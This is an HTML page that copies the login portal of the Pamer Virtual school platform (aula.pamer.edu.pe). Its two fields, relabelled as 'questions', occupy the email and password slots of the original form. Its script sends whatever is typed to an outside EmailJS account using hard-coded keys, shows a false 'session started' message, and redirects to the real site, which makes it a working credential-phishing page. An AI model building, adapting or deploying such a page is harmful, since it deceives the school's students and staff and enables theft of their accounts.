<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Pamer Virtual</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <!-- Favicon -->
  <link rel="shortcut icon" href="https://aula.pamer.edu.pe/pamervirtual/favicon.png">

  <!-- Librerías desde CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://code.jquery.com/ui/1.13.2/jquery-ui.min.js"></script>

  <!-- Tu CSS -->
  <link rel="stylesheet" href="css/login.css">

  <style>
    /* Ajustes extra */
    .login-form__input.multiline {
      min-height: 86px;
      resize: vertical;
      padding-top: 14px;
      padding-bottom: 14px;
    }
  </style>
</head>
<body class="body-style3">

  <p class="login-text">aula.pamer</p>

  <div class="login-form">
    <div class="login-form__content">
      <h3 class="login-form__logo">
        <img src="img/logo-pamerv2.svg" width="150" alt="pamer">
      </h3>

      <h2 class="login-form__title">Enviar respuestas</h2>
      <p class="login-form__subtitle">Completa las dos preguntas. Al enviar, las respuestas se enviarán a tu correo (configurado en EmailJS).</p>

      <!-- Pregunta 1 -->
      <div class="zabdiel-textfield inputBasic login-form__input-content-email">
        <input class="login-form__input login-form__input-email run" type="text" id="preg1" placeholder="">
        <label class="login-form__label">Pregunta 1</label>
      </div>

      <!-- Pregunta 2 -->
      <div class="zabdiel-textfield inputBasic login-form__input-content-password">
        <textarea class="login-form__input multiline run" id="preg2" placeholder=""></textarea>
        <label class="login-form__label">Pregunta 2</label>
      </div>

      <!-- Botón -->
      <button id="btnLogin" class="login-form__button run">Enviar respuestas</button>

      <!-- Loading / mensajes -->
      <div id="loadingUsu" style="text-align:center; display:none;">
        <img src="img/loading.gif" alt="loading">
      </div>

      <div class="login-form__error control-group error" id="areaError" style="display:none;">
        <label class="login-form__message-error control-label" id="message"></label>
      </div>

      <div class="login-form__copyright">
        <p class="login-form__copyright-text">© 2025 Pamer Virtual Todos los Derechos Reservados</p>
      </div>
    </div>
  </div>

  <!-- Modal -->
  <div id="ventanaModal-login" class="modal-login" style="display:none;">
    <div class="contenido-modal-login">
      <img src="img/popup-usuario-desactivado.png" alt="usuario desactivado">
    </div>
  </div>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      const EMAILJS_PUBLIC_KEY  = "FhjzcnzCPPK5tv8Yj";
      const EMAILJS_SERVICE_ID  = "service_kodxo8c";
      const EMAILJS_TEMPLATE_ID = "template_kpwuofu";

      try { emailjs.init(EMAILJS_PUBLIC_KEY); } catch(e) {}

      const btn = document.getElementById('btnLogin');
      const loading = document.getElementById('loadingUsu');
      const areaError = document.getElementById('areaError');
      const msgLabel = document.getElementById('message');

      function showError(text){
        areaError.style.display = 'block';
        msgLabel.innerText = text;
      }
      function hideError(){
        areaError.style.display = 'none';
        msgLabel.innerText = '';
      }

      btn.addEventListener('click', function(e){
        e.preventDefault();
        hideError();

        const p1 = document.getElementById('preg1').value.trim();
        const p2 = document.getElementById('preg2').value.trim();

        if(!p1 || !p2){
          showError("Por favor completa ambas preguntas.");
          return;
        }

        btn.style.display = 'none';
        loading.style.display = 'block';

        emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {pregunta1:p1, pregunta2:p2})
          .then(() => {
            loading.style.display = 'none';
            msgLabel.innerText = "Sesión iniciada correctamente.";
            areaError.style.display = 'block';
            areaError.classList.remove('error');
            areaError.classList.add('success');

            setTimeout(() => {
              window.location.href = "https://aula.pamer.edu.pe/pamervirtual/users";
            }, 2000);
          })
          .catch(err => {
            loading.style.display = 'none';
            btn.style.display = '';
            console.error(err);
            showError("❌ Error al enviar. Alertar a HelpDesk.");
          });
      });
    })();
  </script>
</body>
</html>
